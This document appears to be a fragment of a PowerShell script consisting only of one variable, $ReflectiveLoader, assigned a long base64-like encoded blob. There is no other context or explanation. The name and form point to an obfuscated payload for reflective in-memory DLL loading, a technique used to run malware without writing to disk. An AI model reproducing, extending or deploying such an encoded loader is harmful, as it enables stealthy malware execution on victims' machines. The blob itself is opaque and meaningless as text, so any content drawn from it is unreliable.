    $ReflectiveLoader = "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